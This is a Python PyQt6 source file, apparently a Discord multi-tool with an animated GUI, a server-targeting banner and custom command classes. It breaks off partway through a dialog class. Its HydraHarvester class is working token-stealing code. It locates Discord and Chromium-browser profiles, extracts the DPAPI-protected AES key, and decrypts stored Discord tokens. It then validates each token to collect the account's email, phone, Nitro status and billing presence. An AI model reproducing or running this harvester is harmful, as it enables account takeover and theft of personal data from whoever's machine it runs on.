import sys
import random
import math
import time
import requests
import json
import re
import os
import string
import shutil
import base64
import traceback
import websocket
import copy
import ssl
from concurrent.futures import ThreadPoolExecutor, as_completed, CancelledError
import threading
import zlib
from datetime import datetime
from collections import deque
import tls_client
from bs4 import BeautifulSoup
import queue

from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLabel,
                             QLineEdit, QPushButton, QFrame, QColorDialog, QSlider, QGridLayout,
                             QSizePolicy, QStackedWidget, QButtonGroup, QTextEdit, QCheckBox,
                             QMessageBox, QFileDialog, QGroupBox, QToolTip, QInputDialog,
                             QListWidget, QComboBox, QSpinBox, QListWidgetItem, QDialog, QDialogButtonBox, QTabWidget, QSystemTrayIcon, QMenu, QDoubleSpinBox, QStyle, QStyleOption, QStyleOptionSlider, QGraphicsOpacityEffect, QScrollArea, QRadioButton)

from PyQt6.QtCore import (Qt, QTimer, QPropertyAnimation, QEasingCurve, pyqtProperty,  pyqtSignal,
                          QRect, QPoint, QSequentialAnimationGroup, QThread, QObject, QByteArray, QBuffer, QIODevice, QParallelAnimationGroup, QRectF, QPointF, QUrl, QSize, QSizeF, ) 

from PyQt6.QtGui import (QPainter, QColor, QFont, QPalette, QLinearGradient, QBrush, QFontDatabase, QPen,
                        QRadialGradient, QTextCursor, QScreen, QPixmap, QImage, QDoubleValidator, QIcon, QGradient, QPainterPath, QAction, )

from PIL import Image

from PyQt6.QtWebEngineWidgets import QWebEngineView

from PyQt6.QtWebEngineCore import (QWebEngineProfile, QWebEnginePage, QWebEngineSettings, 
                                   QWebEngineUrlRequestInterceptor, QWebEngineUrlRequestInfo, QWebEngineScript)


try:
    from Crypto.Cipher import AES
    import win32crypt
    print("Cryptography libraries loaded successfully.")
    CRYPTO_LIBS_LOADED = True
except ImportError:
    print("WARNING: pycryptodome or pywin32 is not installed. Data harvesting will fail.")
    CRYPTO_LIBS_LOADED = False

LATEST_BUILD_NUMBER = None
def fetch_and_cache_build_number(token: str):
    """
    Fetches the build number and returns it along with a status message.
    Includes timeouts to prevent the application from hanging.
    """
    global LATEST_BUILD_NUMBER
    if LATEST_BUILD_NUMBER is not None:
        return LATEST_BUILD_NUMBER, f"[INFO] Using cached build number: {LATEST_BUILD_NUMBER}"
    session = None
    try:
        session = tls_client.Session(
            client_identifier="chrome_124",
            random_tls_extension_order=True
        )
        headers = {"Authorization": token}
        response = session.get("https://discord.com/channels/@me", headers=headers, timeout_seconds=20)

        if response.status_code >= 400:
            return None, f"[ERROR] Failed to fetch app page (Status: {response.status_code}). Please check your token."

        soup = BeautifulSoup(response.text, 'lxml')
        script_tags = soup.find_all('script', src=re.compile(r'/assets/.*\.js'))
        asset_links = [tag['src'] for tag in script_tags] if script_tags else []

        for link in reversed(asset_links):
            script_url = f"https://discord.com{link}"
            try:
                script_response = session.get(script_url, headers=headers, timeout_seconds=20)
                if script_response.status_code == 200:
                    build_info = re.search(r'buildNumber:\s*(\d+)', script_response.text, re.I)
                    if build_info:
                        build_number = int(build_info.group(1))
                        LATEST_BUILD_NUMBER = build_number
                        return build_number, f"[INFO] Successfully found and cached build number: {build_number}"
            except Exception:
                continue
    except Exception as e:
        return None, f"[ERROR] An exception occurred while fetching build number: {e}"
    finally:
        if session:
            session.close()

    return None, "[ERROR] Could not find the build number in any of the asset scripts."




class IconDownloader(QObject):
    """Background worker to download an icon from a URL."""
    finished = pyqtSignal(QPixmap)

    def __init__(self, url):
        super().__init__()
        self.url = url

    def run(self):
        try:
            response = requests.get(self.url, timeout=5)
            if response.status_code == 200:
                pixmap = QPixmap()
                pixmap.loadFromData(response.content)
                self.finished.emit(pixmap)
            else:
                self.finished.emit(QPixmap()) # Empty pixmap on failure
        except:
            self.finished.emit(QPixmap())




class NotificationStar:
    """
    Simple star object for the notification banner.
    Matches the behavior of the main background stars.
    """
    def __init__(self, w, h):
        self.x = random.randint(0, w)
        self.y = random.randint(0, h)
        self.size = random.uniform(1.0, 3.0)
        self.opacity = random.random()
        self.speed = random.uniform(0.03, 0.08)
        self.fade_dir = 1
        # Matches your main app's star color palette
        self.color_index = random.randint(0, 3) 

    def update(self, w, h):
        self.opacity += self.speed * self.fade_dir
        if self.opacity >= 1.0:
            self.opacity = 1.0
            self.fade_dir = -1
        elif self.opacity <= 0.2:
            self.opacity = 0.2
            self.fade_dir = 1

class ServerTargetNotification(QWidget):
    """
    A custom banner that slides down to announce the target server.
    Includes server icon support.
    """
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setFixedSize(400, 70)
        self.setWindowFlags(Qt.WindowType.FramelessWindowHint | Qt.WindowType.Tool | Qt.WindowType.WindowStaysOnTopHint)
        self.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        self.setAttribute(Qt.WidgetAttribute.WA_TransparentForMouseEvents)
        
        self.target_name = ""
        self.target_pixmap = None # Store the icon
        self.stars = [NotificationStar(self.width(), self.height()) for _ in range(50)]
        
        self.star_colors = [
            QColor(255, 255, 255), QColor(180, 200, 255), 
            QColor(255, 220, 180), QColor(200, 255, 200)
        ]
        
        self.star_timer = QTimer(self)
        self.star_timer.timeout.connect(self.update_stars)
        self.hide_timer = QTimer(self)
        self.hide_timer.setSingleShot(True)
        self.hide_timer.timeout.connect(self.hide_animation)

        self.opacity_effect = QGraphicsOpacityEffect(self)
        self.setGraphicsEffect(self.opacity_effect)
        self.opacity_effect.setOpacity(0.0)

    def update_stars(self):
        for star in self.stars:
            star.update(self.width(), self.height())
        self.update()

    # UPDATED METHOD
    def show_message(self, server_name, pixmap=None):
        self.target_name = server_name
        self.target_pixmap = pixmap # Save the image
        self.star_timer.start(30)
        
        if self.parent():
            parent_geo = self.parent().geometry()
            x = (parent_geo.width() - self.width()) // 2
            final_y = parent_geo.y() + 20
            self.move(parent_geo.x() + x, final_y)
            self.raise_()

            self.slide_anim = QPropertyAnimation(self, b"pos")
            self.slide_anim.setDuration(600)
            start_point = QPoint(parent_geo.x() + x, final_y - 60)
            end_point = QPoint(parent_geo.x() + x, final_y)
            
            self.slide_anim.setStartValue(start_point)
            self.slide_anim.setEndValue(end_point)
            self.slide_anim.setEasingCurve(QEasingCurve.Type.OutBack)

            self.fade_anim = QPropertyAnimation(self.opacity_effect, b"opacity")
            self.fade_anim.setDuration(400)
            self.fade_anim.setStartValue(0.0)
            self.fade_anim.setEndValue(1.0)

            self.entry_group = QParallelAnimationGroup()
            self.entry_group.addAnimation(self.slide_anim)
            self.entry_group.addAnimation(self.fade_anim)
            
            self.show()
            self.entry_group.start()
            self.hide_timer.start(4000)

    def hide_animation(self):
        self.exit_slide = QPropertyAnimation(self, b"pos")
        self.exit_slide.setDuration(400)
        self.exit_slide.setStartValue(self.pos())
        self.exit_slide.setEndValue(QPoint(self.x(), self.y() - 60))
        self.exit_slide.setEasingCurve(QEasingCurve.Type.InCubic)

        self.exit_fade = QPropertyAnimation(self.opacity_effect, b"opacity")
        self.exit_fade.setDuration(300)
        self.exit_fade.setStartValue(1.0)
        self.exit_fade.setEndValue(0.0)

        self.exit_group = QParallelAnimationGroup()
        self.exit_group.addAnimation(self.exit_slide)
        self.exit_group.addAnimation(self.exit_fade)
        self.exit_group.finished.connect(self._on_hidden)
        self.exit_group.start()

    def _on_hidden(self):
        self.star_timer.stop()
        self.hide()

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.RenderHint.Antialiasing)
        
        # Background
        path = QPainterPath()
        path.addRoundedRect(QRectF(self.rect()).adjusted(1, 1, -1, -1), 15, 15)
        grad = QLinearGradient(0, 0, 0, self.height())
        grad.setColorAt(0, QColor(8, 12, 20, 245))
        grad.setColorAt(1, QColor(4, 6, 12, 245))
        painter.setBrush(grad)
        painter.setPen(QPen(QColor(99, 179, 237, 180), 1.5))
        painter.drawPath(path)

        # Stars
        painter.setClipPath(path)
        painter.setPen(Qt.PenStyle.NoPen)
        for star in self.stars:
            base_col = self.star_colors[star.color_index]
            base_col.setAlphaF(star.opacity)
            painter.setBrush(base_col)
            painter.drawEllipse(QPointF(star.x, star.y), star.size, star.size)

        painter.setClipping(False)

        # --- DRAW ICON ---
        text_offset_x = 0
        if self.target_pixmap and not self.target_pixmap.isNull():
            icon_size = 40
            icon_x = 20
            icon_y = (self.height() - icon_size) // 2
            
            # Draw rounded icon
            icon_path = QPainterPath()
            icon_path.addEllipse(icon_x, icon_y, icon_size, icon_size)
            painter.save()
            painter.setClipPath(icon_path)
            painter.drawPixmap(icon_x, icon_y, icon_size, icon_size, self.target_pixmap)
            painter.restore()
            
            text_offset_x = 50 # Shift text to the right

        # Text
        painter.setFont(QFont("Segoe UI", 9, QFont.Weight.Bold))
        painter.setPen(QColor(160, 174, 192))
        painter.drawText(QRect(text_offset_x, 12, self.width() - text_offset_x, 15), 
                        Qt.AlignmentFlag.AlignCenter, "TARGETING SERVER")
        
        painter.setFont(QFont("Segoe UI", 13, QFont.Weight.Bold))
        painter.setPen(QColor(255, 255, 255))
        metrics = painter.fontMetrics()
        elided_text = metrics.elidedText(self.target_name, Qt.TextElideMode.ElideRight, self.width() - 40 - text_offset_x)
        painter.drawText(QRect(text_offset_x, 32, self.width() - text_offset_x, 25), 
                        Qt.AlignmentFlag.AlignCenter, elided_text)


class PinnableImageLabel(QLabel):
    """A QLabel that displays an image and has a close button."""
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setScaledContents(False)
        self.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.setStyleSheet("QLabel { border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; }")
        self.setFixedSize(150, 100)

        self.close_button = QLabel("×", self)
        self.close_button.setStyleSheet("QLabel { color: white; background-color: rgba(0,0,0,0.6); border-radius: 7px; padding: 0px 4px; font-size: 14px; font-weight: bold; }")
        self.close_button.setCursor(Qt.CursorShape.PointingHandCursor)
        self.close_button.mousePressEvent = self.close_preview
        self.close_button.hide()

    def setPixmap(self, pixmap):
        if pixmap and not pixmap.isNull():
            super().setPixmap(pixmap.scaled(150, 100, Qt.AspectRatioMode.KeepAspectRatio, Qt.TransformationMode.SmoothTransformation))
            self.close_button.show()
            self.adjustSize()
            self.close_button.move(self.width() - self.close_button.width() - 5, 5)
        else:
            super().setPixmap(QPixmap())
            self.close_button.hide()

    def close_preview(self, event):
        self.setPixmap(QPixmap())
        self.hide()



class ProfilePicLabel(QLabel):
    """A clickable, circular QLabel to display a user's avatar."""
    clicked = pyqtSignal()

    def __init__(self, token, parent=None):
        super().__init__(parent)
        self.token = token
        self.setFixedSize(50, 50)
        self.setScaledContents(True)
        self.setCursor(Qt.CursorShape.PointingHandCursor)
        # ADD 'outline: none;' to the stylesheet
        self.setStyleSheet("border-radius: 25px; border: 2px solid transparent; background-color: rgba(0,0,0,0.3); outline: none;")

    # In the ProfilePicLabel class:
    def set_active(self, is_active):
        if is_active:
            # Changed border-radius to 8px for a square effect
            self.setStyleSheet("border-radius: 8px; border: 2px solid #63b3ed; outline: none;")
        else:
            self.setStyleSheet("border-radius: 25px; border: 2px solid transparent; background-color: rgba(0,0,0,0.3); outline: none;")


    def mousePressEvent(self, event):
        self.clicked.emit()
        super().mousePressEvent(event)




class HydraHarvester:
    def __init__(self):
        self.roaming = os.getenv("APPDATA")
        self.local = os.getenv("LOCALAPPDATA")
        self.temp_dir = os.path.join(os.getenv("TEMP"), "hydra_cache")
        os.makedirs(self.temp_dir, exist_ok=True)
        self.paths = self._discover_paths()

    def _discover_paths(self):
        """Dynamically finds all potential paths for Discord clients and browsers."""
        discovered = {}
        potential_locations = {
            'Discord': os.path.join(self.roaming, 'discord'),
            'Discord Canary': os.path.join(self.roaming, 'discordcanary'),
            'Discord PTB': os.path.join(self.roaming, 'discordptb'),
            'Google Chrome': os.path.join(self.local, 'Google', 'Chrome', 'User Data'),
            'Brave': os.path.join(self.local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'Microsoft Edge': os.path.join(self.local, 'Microsoft', 'Edge', 'User Data'),
            'Opera': os.path.join(self.roaming, 'Opera Software', 'Opera Stable'),
            'Opera GX': os.path.join(self.roaming, 'Opera Software', 'Opera GX Stable'),
            'Vivaldi': os.path.join(self.local, 'Vivaldi', 'User Data'),
            'Yandex': os.path.join(self.local, 'Yandex', 'YandexBrowser', 'User Data'),
        }
        for name, path in potential_locations.items():
            if os.path.exists(path):
                discovered[name] = path
        return discovered

    def _get_encryption_key(self, app_path):
        """Extracts the AES encryption key from the app's 'Local State' file."""
        local_state_path = os.path.join(app_path, "Local State")
        if not os.path.exists(local_state_path) or not CRYPTO_LIBS_LOADED: return None
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except Exception: return None

    def _decrypt_data(self, data, key):
        """Decrypts data using the AES key (for Chromium/Discord) or fallback DPAPI."""
        if not CRYPTO_LIBS_LOADED: return "decryption_failed_no_libs"
        try:
            iv = data[3:15]
            payload = data[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            return decrypted_pass[:-16].decode()
        except Exception:
            try:
                return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
            except Exception: return "decryption_failed"

    def _get_token_info(self, token):
        """Validates a token and fetches associated account information."""
        headers = {"Authorization": token, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"}
        res = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
        if res.status_code == 200:
            user_data = res.json()
            billing_res = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=headers)
            has_billing = True if billing_res.json() else False
            
            return {
                "username": f"{user_data['username']}#{user_data['discriminator']}",
                "user_id": user_data['id'],
                "email": user_data.get('email', 'N/A'),
                "phone": user_data.get('phone', 'N/A'),
                "nitro": "Nitro Classic" if user_data.get('premium_type') == 1 else "Nitro" if user_data.get('premium_type') == 2 else "None",
                "billing": "Yes" if has_billing else "No",
                "token": token,
            }
        return None

    def harvest_tokens(self):
        """Re-engineered token harvesting via direct decryption."""
        found_tokens = set()
        for name, path in self.paths.items():
            if "discord" not in name.lower(): continue
            key = self._get_encryption_key(path)
            if not key: continue
            storage_path = os.path.join(path, 'Local Storage', 'leveldb')
            if not os.path.exists(storage_path): continue
            
            for file_name in os.listdir(storage_path):
                if not file_name.endswith((".log", ".ldb")): continue
                file_path = os.path.join(storage_path, file_name)
                try:
                    with open(file_path, 'r', errors='ignore') as f:
                        for line in f:
                            for match in re.finditer(r'dQw4w9WgXcQ:[^"]*', line):
                                encrypted_token = base64.b64decode(match.group().split(':')[-1])
                                decrypted_token = self._decrypt_data(encrypted_token, key)
                                if decrypted_token and decrypted_token.startswith(("mfa.", "MT", "ND", "OD", "OT")):
                                    found_tokens.add(decrypted_token)
                except Exception:
                    continue
        
        valid_accounts = []
        for token in found_tokens:
            account_info = self._get_token_info(token)
            if account_info:
                valid_accounts.append(account_info)
        return valid_accounts

    

class ImagePreviewGrid(QWidget):
    """A new widget to display and manage the 3x3 grid of image previews."""
    def __init__(self, parent=None):
        super().__init__(parent)
        self.image_labels = []
        self.layout = QGridLayout(self)
        self.layout.setSpacing(10)

        for i in range(9):
            label = PinnableImageLabel()
            label.hide()
            self.image_labels.append(label)
            self.layout.addWidget(label, i // 3, i % 3)

    def add_image(self, image: QImage):
        """Adds a pasted image to the next available slot in the grid."""
        for label in self.image_labels:
            if not label.pixmap() or label.pixmap().isNull():
                pixmap = QPixmap.fromImage(image)
                label.setPixmap(pixmap)
                label.show()
                return True 
        return False 

    def get_all_images_data(self):
        """Collects the binary data of all images currently in the grid."""
        images_data = []
        for label in self.image_labels:
            if label.pixmap() and not label.pixmap().isNull():
                pixmap = label.pixmap()
                byte_array = QByteArray()
                buffer = QBuffer(byte_array)
                buffer.open(QIODevice.WriteOnly)
                pixmap.save(buffer, "PNG")
                images_data.append(byte_array.data())
        return images_data




class AnimatedCheckBox(QCheckBox):
    """
    A larger checkbox that replicates the simple, filled-box style of the original
    ModernCheckBox, but with a smooth fade animation between the background colors.
    This version is a correct PyQt6 port of the working PyQt5 logic.
    """
    def __init__(self, text="", parent=None):
        super().__init__(text, parent)
        
        self.setFixedHeight(28)

        self._color_factor = 1.0 if self.isChecked() else 0.0
        
        # --- MODIFICATION: Check for performance mode ---
        self.performance_mode = False
        main_window = self.window()
        if hasattr(main_window, 'main_gui') and main_window.main_gui and hasattr(main_window.main_gui, 'performance_mode_check'):
            self.performance_mode = main_window.main_gui.performance_mode_check.isChecked()
        # --- END MODIFICATION ---

        self.animation = QPropertyAnimation(self, b"colorFactor")
        self.animation.setDuration(180)
        self.animation.setStartValue(0.0)
        self.animation.setEndValue(1.0)

        self.stateChanged.connect(self._start_animation)

    @pyqtProperty(float)
    def colorFactor(self):
        return self._color_factor

    @colorFactor.setter
    def colorFactor(self, value):
        self._color_factor = value
        self.update()

    def _start_animation(self, state):
        # --- MODIFICATION: Bypass animation in performance mode ---
        if self.performance_mode:
            self.animation.stop()
            self._color_factor = 1.0 if state == Qt.CheckState.Checked.value else 0.0
            self.update()
            return
        # --- END MODIFICATION ---

        if state == Qt.CheckState.Checked.value:
            self.animation.setDirection(QPropertyAnimation.Direction.Forward)
        else:
            self.animation.setDirection(QPropertyAnimation.Direction.Backward)
        self.animation.start()
        
    def sizeHint(self):
        metrics = self.fontMetrics()
        text_width = metrics.horizontalAdvance(self.text())
        return QSize(22 + 10 + text_width, 28)

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.RenderHint.Antialiasing)

        opt = QStyleOption()
        opt.initFrom(self)
        
        indicator_size = 22
        indicator_rect = QRect(opt.rect.x(), opt.rect.y() + (opt.rect.height() - indicator_size) // 2, indicator_size, indicator_size)
        
        spacing = 10
        text_rect = QRect(indicator_rect.right() + spacing, opt.rect.y(), opt.rect.width() - indicator_size - spacing, opt.rect.height())

        unchecked_color = QColor(26, 32, 44, 153)
        checked_color = QColor(99, 179, 237, 204)
        
        current_bg_color = QColor(
            int(unchecked_color.red() * (1 - self._color_factor) + checked_color.red() * self._color_factor),
            int(unchecked_color.green() * (1 - self._color_factor) + checked_color.green() * self._color_factor),
            int(unchecked_color.blue() * (1 - self._color_factor) + checked_color.blue() * self._color_factor)
        )
        
        painter.setPen(QPen(QColor(255, 255, 255, 102), 1))
        painter.setBrush(current_bg_color)
        painter.drawRoundedRect(indicator_rect, 6, 6)

        if self._color_factor > 0:
            check_pen = QPen(QColor(255, 255, 255))
            check_pen.setWidth(2)
            check_pen.setCapStyle(Qt.PenCapStyle.RoundCap)
            
            check_pen.setColor(QColor(255, 255, 255, int(255 * self._color_factor)))
            painter.setPen(check_pen)

            path = QPainterPath()
            path.moveTo(QPointF(indicator_rect.left() + 6, indicator_rect.top() + 11))  
            path.lineTo(QPointF(indicator_rect.left() + 10, indicator_rect.top() + 15)) 
            path.lineTo(QPointF(indicator_rect.left() + 16, indicator_rect.top() + 7))   
            
            painter.drawPath(path)

        painter.setPen(QColor(255, 255, 255, 204))
        painter.setFont(self.font())
        painter.drawText(text_rect, Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignVCenter, self.text())

class AnimatedSlider(QSlider):
    def __init__(self, orientation, parent=None):
        super().__init__(orientation, parent)
        self.setMouseTracking(True)
        self.setMinimumHeight(28)

        # --- MODIFICATION: Check for performance mode ---
        self.performance_mode = False
        main_window = self.window()
        if hasattr(main_window, 'main_gui') and main_window.main_gui and hasattr(main_window.main_gui, 'performance_mode_check'):
            self.performance_mode = main_window.main_gui.performance_mode_check.isChecked()
        # --- END MODIFICATION ---

        self.target_val = self.value()
        self.visual_val = float(self.value())
        
        self.update_timer = QTimer(self)
        self.update_timer.setInterval(8)
        self.update_timer.timeout.connect(self._update_visual_value)
        self.lerp_factor = 0.12

        self._hovered = False

    def _update_visual_value(self):
        # --- MODIFICATION: Bypass lerp if performance mode is on ---
        if self.performance_mode:
            self.visual_val = float(self.target_val)
            self.update_timer.stop()
            self.update()
            return
        # --- END MODIFICATION ---

        diff = self.target_val - self.visual_val
        if abs(diff) < 0.01:
            self.visual_val = float(self.target_val)
            self.update_timer.stop()
        else:
            self.visual_val += diff * self.lerp_factor
        
        self.update()

    def _pos_to_val(self, pos):
        opt = QStyleOptionSlider()
        self.initStyleOption(opt)
        gr = self.style().subControlRect(QStyle.ComplexControl.CC_Slider, opt, QStyle.SubControl.SC_SliderGroove, self)
        gr.adjust(10, 0, -10, 0)
        sr = self.style().subControlRect(QStyle.ComplexControl.CC_Slider, opt, QStyle.SubControl.SC_SliderHandle, self)

        if self.orientation() == Qt.Orientation.Horizontal:
            slider_length = gr.width() - sr.width()
            slider_pos = pos.x() - gr.x() - sr.width() / 2
        else:
            slider_length = gr.height() - sr.height()
            slider_pos = pos.y() - gr.y() - sr.height() / 2

        return self.minimum() + (self.maximum() - self.minimum()) * slider_pos / slider_length

    def mousePressEvent(self, event):
        new_val = self._pos_to_val(event.position())
        self.setValue(new_val)
        super().mousePressEvent(event)

    def mouseMoveEvent(self, event):
        if event.buttons() & Qt.MouseButton.LeftButton:
            new_val = self._pos_to_val(event.position())
            self.setValue(new_val)
        super().mouseMoveEvent(event)

    def enterEvent(self, event):
        self._hovered = True
        self.update()
        super().enterEvent(event)

    def leaveEvent(self, event):
        self._hovered = False
        self.update()
        super().leaveEvent(event)

    def setValue(self, value):
        value = max(self.minimum(), min(self.maximum(), value))
        if self.target_val != value:
            self.target_val = value
            super().setValue(int(round(value)))
            
            # --- MODIFICATION: Bypass animation timer in performance mode ---
            if self.performance_mode:
                self.visual_val = float(value)
                self.update()
                if self.update_timer.isActive():
                    self.update_timer.stop()
                return
            # --- END MODIFICATION ---

            if not self.update_timer.isActive():
                self.update_timer.start()

    def paintEvent(self, event):
        painter = QPainter(self)
        painter.setRenderHint(QPainter.RenderHint.Antialiasing)

        opt = QStyleOptionSlider()
        self.initStyleOption(opt)

        groove_rect = self.rect().adjusted(10, 0, -10, 0)
        groove_rect.setHeight(8)
        groove_rect.moveCenter(self.rect().center())


        painter.setPen(Qt.PenStyle.NoPen)
        painter.setBrush(QColor(74, 85, 104, 102))
        painter.drawRoundedRect(groove_rect, 4, 4)

        handle_rect = self.style().subControlRect(QStyle.ComplexControl.CC_Slider, opt, QStyle.SubControl.SC_SliderHandle, self)
        progress = (self.visual_val - self.minimum()) / (self.maximum() - self.minimum())
        
        if self.orientation() == Qt.Orientation.Horizontal:
            slider_width = groove_rect.width() - handle_rect.width()
            handle_x = groove_rect.left() + slider_width * progress
            handle_y = groove_rect.center().y() - handle_rect.height() / 2
            filled_rect = QRectF(groove_rect.x(), groove_rect.y(), handle_x + handle_rect.width()/2 - groove_rect.x(), groove_rect.height())
        else: 
            slider_height = groove_rect.height() - handle_rect.height()
            handle_y = groove_rect.top() + slider_height * (1-progress)
            handle_x = groove_rect.center().x() - handle_rect.width() / 2
            filled_rect = QRectF(groove_rect.x(), handle_y, groove_rect.width(), groove_rect.height() - (handle_y - groove_rect.y()))

        painter.setBrush(QColor(99, 179, 237, 153))
        painter.drawRoundedRect(filled_rect, 4, 4)

        handle_center = QPointF(handle_x + handle_rect.width()/2, handle_y + handle_rect.height()/2)
        handle_radius = 9
        
        if self._hovered or self.isSliderDown():
            glow_color = QColor(99, 179, 237, 80)
            painter.setPen(Qt.PenStyle.NoPen)
            painter.setBrush(glow_color)
            painter.drawEllipse(handle_center, handle_radius + 3, handle_radius + 3)

        handle_color = QColor(99, 179, 237, 204)
        handle_border_color = QColor(99, 179, 237, 230)
        
        painter.setBrush(handle_color)
        painter.setPen(QPen(handle_border_color, 1))
        painter.drawEllipse(handle_center, handle_radius, handle_radius)




class ModernLineEdit(QLineEdit):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setFixedHeight(52)
        self.setFont(QFont("Segoe UI", 11))

        # --- MODIFICATION: Dynamically remove CSS transitions ---
        stylesheet = """
            QLineEdit {
                background: rgba(26, 32, 44, 0.6);
                border: 1.5px solid rgba(74, 85, 104, 0.4);
                border-radius: 26px;
                color: white;
                padding: 0px 20px;
                selection-background-color: rgba(99, 179, 237, 0.3);
                font-size: 11px;
                transition: border-color 0.2s ease-out, background 0.2s ease-out;
            }
            QLineEdit:focus {
                border: 1.5px solid rgba(99, 179, 237, 0.8);
                background: rgba(26, 32, 44, 0.8);
                box-shadow: 0 0 0 3px rgba(99, 179, 237, 0.1);
                color: white;
            }
            QLineEdit::placeholder {
                color: rgba(160, 174, 192, 0.6);
            }
        """
        
        main_window = self.window()
        performance_mode = False
        if hasattr(main_window, 'main_gui') and main_window.main_gui and hasattr(main_window.main_gui, 'performance_mode_check'):
            performance_mode = main_window.main_gui.performance_mode_check.isChecked()

        if performance_mode:
            stylesheet = re.sub(r'transition: .*?;', '', stylesheet)

        self.setStyleSheet(stylesheet)
        # --- END MODIFICATION ---

class ModernTextEdit(QTextEdit):
    def __init__(self, parent=None):
        super().__init__(parent)
        
        # --- MODIFICATION: Dynamically remove CSS transitions ---
        stylesheet = """
            QTextEdit {
                background: rgba(26, 32, 44, 0.6);
                border: 1.5px solid rgba(74, 85, 104, 0.4);
                border-radius: 12px;
                color: white;
                padding: 10px;
                selection-background-color: rgba(99, 179, 237, 0.3);
                font-size: 11px;
                transition: border-color 0.2s ease-out, background 0.2s ease-out;
            }
            QTextEdit:focus {
                border: 1.5px solid rgba(99, 179, 237, 0.8);
                background: rgba(26, 32, 44, 0.8);
            }
        """
        main_window = self.window()
        performance_mode = False
        if hasattr(main_window, 'main_gui') and main_window.main_gui and hasattr(main_window.main_gui, 'performance_mode_check'):
            performance_mode = main_window.main_gui.performance_mode_check.isChecked()

        if performance_mode:
            stylesheet = re.sub(r'transition: .*?;', '', stylesheet)
            
        self.setStyleSheet(stylesheet)
        # --- END MODIFICATION ---


        
class ImagePastingTextEdit(ModernTextEdit):
    """A custom QTextEdit that can handle pasted images by emitting a signal."""
    imagePasted = pyqtSignal(QImage)

    def canInsertFromMimeData(self, source):
        # Allow pasting if the data is an image or if it's something the parent class can handle (like text)
        return source.hasImage() or super().canInsertFromMimeData(source)

    def insertFromMimeData(self, source):
        if source.hasImage():
            # If it's an image, emit a signal with the image data
            image = source.imageData()
            if isinstance(image, QImage):
                self.imagePasted.emit(image)
        else:
            # Otherwise, perform the default paste operation (for text)
            super().insertFromMimeData(source)

class Star:
    def __init__(self, x, y, color_index):
        self.x = x
        self.y = y
        self.opacity = random.uniform(0.2, 1.0)
        self.fade_speed = random.uniform(0.02, 0.08)
        self.fade_direction = random.choice([-1, 1])
        self.size = random.uniform(0.8, 2.5)
        self.twinkle_offset = random.uniform(0, 2 * math.pi)
        self.color_index = color_index

    def update(self):
        self.opacity += self.fade_speed * self.fade_direction
        if self.opacity >= 1.0:
            self.opacity = 1.0
            self.fade_direction = -1
        elif self.opacity <= 0.1:
            self.opacity = 0.1
            self.fade_direction = 1

        self.twinkle_offset += 0.1
        twinkle = 0.3 * math.sin(self.twinkle_offset)
        self.opacity = max(0.1, min(1.0, self.opacity + twinkle))





# Place this after your PyQt5 imports but before the existing bot classes
class CustomCommand:
    def __init__(self, name: str, aliases: list, actions: list, duration_type: str = "until_done", duration_value: int = 0, enabled: bool = True):
        self.name = name
        self.aliases = aliases
        self.actions = actions
        self.duration_type = duration_type
        self.duration_value = duration_value
        self.enabled = enabled

    def to_dict(self):
        return {
            "name": self.name,
            "aliases": self.aliases,
            "actions": self.actions,
            "duration_type": self.duration_type,
            "duration_value": self.duration_value,
            "enabled": self.enabled
        }

    @staticmethod
    def from_dict(data: dict):
        command = CustomCommand(
            data.get("name", "Unnamed Command"),
            data.get("aliases", []),
            data.get("actions", []),
            data.get("duration_type", "until_done"),
            data.get("duration_value", 0),
            data.get("enabled", True)
        )
        return command





class StyledDialog(QDialog):
    """A base QDialog with a custom frameless window, animated background, and modern styling."""
    def __init__(self, title, parent=None):
        super().__init__(parent)
        self.drag_position = None
        self.animation = None
        self.target_pos = QPointF(self.pos())
        self.drag_timer = QTimer(self)
        self.drag_timer.setInterval(8)
        self.drag_timer.timeout.connect(self._update_drag_position)
        self.lerp_factor = 0.08

        self._is_closing = False
        self._result = QDialog.DialogCode.Rejected
        
        # --- THIS IS THE CORRECTED LOGIC ---
        self.performance_mode = False
        # The parent of the dialog is the MainGUI widget, which has the checkbox
        if parent and hasattr(parent, 'performance_mode_check'):
            self.performance_mode = parent.performance_mode_check.isChecked()
        # --- END CORRECTION ---

        self.setWindowFlags(Qt.WindowType.FramelessWindowHint | Qt.WindowType.Dialog)
        self.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        
        # Instantly set opacity if in performance mode
        self.setWindowOpacity(1.0 if self.performance_mode else 0.0)

        self.background = AnimatedBackground(self, borderRadius=12)

        self.base_layout = QVBoxLayout(self)
        self.base_layout.setContentsMargins(0, 0, 0, 0)
        self.central_frame = QFrame()
        self.central_frame.setStyleSheet("""
            QFrame {
                background: rgba(18, 22, 33, 0.85);
                border-radius: 12px;
                border: 1px solid rgba(255, 255, 255, 0.1);
            }
        """)
        self.base_layout.addWidget(self.central_frame)

        self.content_layout = QVBoxLayout(self.central_frame)
        self.content_layout.setContentsMargins(20, 10, 20, 20)
        self.content_layout.setSpacing(15)

        self.title_bar = QFrame()
        self.title_bar.setFixedHeight(30)
        self.title_bar.setStyleSheet("background: transparent;")
        title_bar_layout = QHBoxLayout(self.title_bar)
        title_bar_layout.setContentsMargins(5, 0, 5, 0)

        title_label = QLabel(title)
